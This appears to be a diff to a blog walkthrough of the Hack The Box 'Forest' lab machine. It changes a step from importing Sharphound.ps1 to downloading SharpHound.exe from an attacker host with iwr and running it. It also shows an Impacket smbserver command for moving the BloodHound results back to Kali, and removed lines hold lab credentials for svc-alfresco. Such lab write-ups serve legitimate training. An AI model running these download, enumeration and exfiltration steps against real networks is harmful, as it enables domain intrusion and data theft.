@@ -299,30 +299,24 @@ making it easier to remove later.
 ```
 mkdir c:\boo
 ```
-changing to that directory I download then import Sharphound.ps1
+changing to that directory I upload SharpHound.exe to it.
 
 ```
-PS > iwr -uri http://10.10.14.24/Sharphound.ps1 -outfile c:\boo\sh.ps1
+PS > iwr -uri http://10.10.14.24/SharpHound.exe -outfile c:\boo\sh.exe
 ```
 
-Import Bloodhound, then execute.
+
+Execute it with
 ```
-import-module .\sh.ps1
-
-
-invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice
-or 
-
-invoke-bloodhound -CollectionMethod All -SearchForest -ldapuser svc-alfresco -ldappass s3rvice
-
+sh.exe
 ```
+
 
 ![bloodhound](/assets/img/forest/forest-bloodhound.png)
 
 Bloodhound creates a zip file that we need to get back to Kali.
 
 Impacket's smbserver.py can help us here.
-
 
 ```
 root@kali:~/HTB/active/forest# smbserver.py sh1n . -smb2support -username foo -password bar
@@ -359,7 +353,6 @@ We should probably also remove the zip, incase some other HTB users find it.
 del *.zip
 ```
 
-
 <hr width="300" size="10">
 
 
@@ -367,6 +360,9 @@ After examining the results, and adjusting svc-alfresco's group memberships I hi
 
 
 <hr width="300" size="10">
+
+
+
 
 
 <h3>Add User</h3>
